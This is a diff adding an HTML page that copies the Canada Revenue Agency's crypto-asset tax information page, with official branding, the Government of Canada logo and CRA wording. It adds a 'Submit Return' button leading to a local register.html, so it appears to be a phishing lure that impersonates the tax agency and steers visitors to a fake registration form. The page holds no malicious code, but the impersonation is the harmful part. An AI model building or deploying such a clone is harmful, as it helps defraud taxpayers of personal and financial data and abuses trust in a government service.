@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Information for crypto-asset users and tax professionals - Canada.ca</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans', sans-serif;
+            color: #333;
+        }
+        .container-custom {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+        .btn-cra-blue {
+            background-color: #26374a;
+            color: white;
+            padding: 8px 15px;
+            font-weight: 700;
+            font-size: 14px;
+        }
+        .search-container {
+            display: flex;
+            align-items: center;
+        }
+        .search-input {
+            border: 1px solid #ccc;
+            padding: 6px 10px;
+            width: 250px;
+        }
+        .search-button {
+            background-color: #26374a;
+            color: white;
+            padding: 6px 12px;
+            border: 1px solid #26374a;
+        }
+        .nav-bar {
+            background-color: #26374a;
+            height: 50px;
+        }
+        .breadcrumb-item {
+            display: inline-flex;
+            align-items: center;
+            color: #335075;
+        }
+        .breadcrumb-item i {
+            margin: 0 10px;
+            font-size: 10px;
+            color: #333;
+        }
+        .red-accent {
+            border-bottom: 4px solid #af3c43;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .info-callout {
+            border-left: 5px solid #31708f;
+            background-color: #fff;
+            padding: 10px 0 10px 20px;
+            display: flex;
+            margin-bottom: 30px;
+        }
+        .info-callout i {
+            color: #31708f;
+            font-size: 24px;
+            margin-right: 15px;
+        }
+        .feedback-box {
+            background-color: #f5f5f5;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 40px;
+            border-radius: 4px;
+        }
+        .btn-feedback {
+            background-color: #335075;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body class="bg-white">
+
+    <!-- Top Header -->
+    <header class="py-6">
+        <div class="container-custom flex justify-between items-start">
+            <div class="flex flex-col">
+                <div class="flex justify-end mb-4 md:hidden">
+                     <a href="index-fr.html" class="text-[#335075] hover:underline text-sm font-semibold underline">Français</a>
+                </div>
+                <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-10">
+            </div>
+            <div class="hidden md:flex flex-col items-end">
+                <a href="index-fr.html" class="text-[#335075] hover:underline text-sm font-semibold underline mb-4">Français</a>
+                <div class="search-container">
+                    <input type="text" placeholder="Search CRA" class="search-input">
+                    <button class="search-button">
+                        <i class="fas fa-search"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Nav Bar -->
+    <nav class="nav-bar">
+        <div class="container-custom flex justify-between items-center h-full">
+            <button class="flex items-center space-x-2 bg-[#26374a] px-4 h-full font-bold text-white border-l border-r border-gray-700">
+                <span>MENU</span>
+                <i class="fas fa-caret-down"></i>
+            </button>
+            <button class="bg-[#26374a] px-4 h-full font-bold text-white flex items-center">
+                CRA sign in
+            </button>
+        </div>
+    </nav>
+
+    <!-- Breadcrumbs -->
+    <div class="bg-white py-3 border-b border-gray-100">
+        <div class="container-custom text-sm">
+            <nav class="flex items-center space-x-0">
+                <a href="#" class="text-[#335075] hover:underline">Canada.ca</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <a href="#" class="text-[#335075] hover:underline">Canada Revenue Agency (CRA)</a>
+                <i class="fas fa-chevron-right text-[10px] mx-3 text-gray-400"></i>
+                <a href="#" class="text-[#335075] hover:underline">CRA compliance and enforcement</a>
+            </nav>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="container-custom py-10">
+        <div class="red-accent">
+            <h1 class="text-4xl font-bold pb-2">Information for crypto-asset users and tax professionals</h1>
+        </div>
+
+        <div class="space-y-6 text-lg mb-8 max-w-5xl">
+            <p>
+                Since 2008, the crypto-asset industry has continued to evolve based on innovations within the space and its increased adoption worldwide. The Canada Revenue Agency (CRA) has therefore published tax guidance to clarify tax treatment of crypto-asset activities and ensures to update its webpages as developments emerge.
+            </p>
+            <p>
+                The webpages linked below provide general tax information related to crypto-assets. You will also find links to more technical information.
+            </p>
+        </div>
+
+        <!-- Submit Return Button -->
+        <div class="mb-10">
+            <button onclick="window.location.href='register.html'" class="bg-[#335075] text-white px-6 py-3 rounded text-lg font-bold hover:bg-[#26374a] transition duration-200">
+                Submit Return
+            </button>
+        </div>
+
+        <!-- Info Callout -->
+        <div class="info-callout">
+            <i class="fas fa-info-circle"></i>
+            <p class="text-lg text-gray-700">
+                The descriptions below reference terms as they are commonly understood in the crypto-asset industry and are provided for information purposes only. The CRA is not expressing any opinion or position by presenting this information.
+            </p>
+        </div>
+
+        <!-- Grid Sections -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-10 mb-16">
+            <!-- Item 1 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Understanding crypto-assets and your tax obligations</div>
+                <p class="text-gray-700">Crypto-assets and their attributes for tax purposes</p>
+            </div>
+            <!-- Item 2 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Keeping books and records of crypto-assets for tax filing</div>
+                <p class="text-gray-700">Crypto-asset books and records to keep for tax filing purposes</p>
+            </div>
+            <!-- Item 3 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Determining the value of crypto-assets for tax filing</div>
+                <p class="text-gray-700">Valuing your crypto-assets</p>
+            </div>
+            <!-- Item 4 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Reporting income from crypto-asset transactions</div>
+                <p class="text-gray-700">Income tax implications of common transactions involving crypto-assets</p>
+            </div>
+            <!-- Item 5 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Reporting income from crypto-asset mining and staking activities</div>
+                <p class="text-gray-700">Tax implications of mining and staking crypto-assets</p>
+            </div>
+            <!-- Item 6 -->
+            <div>
+                <div class="text-[#333] text-xl font-bold mb-2">Collecting and remitting GST/HST from crypto-asset transactions</div>
+                <p class="text-gray-700">Transactions that may have GST/HST implications</p>
+            </div>
+        </div>
+
+        <!-- Feedback Section -->
+        <div class="feedback-box">
+            <span class="font-bold text-gray-800">Did you find what you were looking for?</span>
+            <button class="btn-feedback">Yes</button>
+            <button class="btn-feedback">No</button>
+        </div>
+
+        <div class="mt-10 mb-20">
+            <p class="text-gray-600 text-sm">Date modified: 2023-12-13</p>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-[#26374a] text-white py-16 border-t-8 border-[#af3c43]">
+        <div class="container-custom">
+            <h2 class="text-2xl font-bold">Canada Revenue Agency (CRA)</h2>
+        </div>
+    </footer>
+
+</body>
+</html>
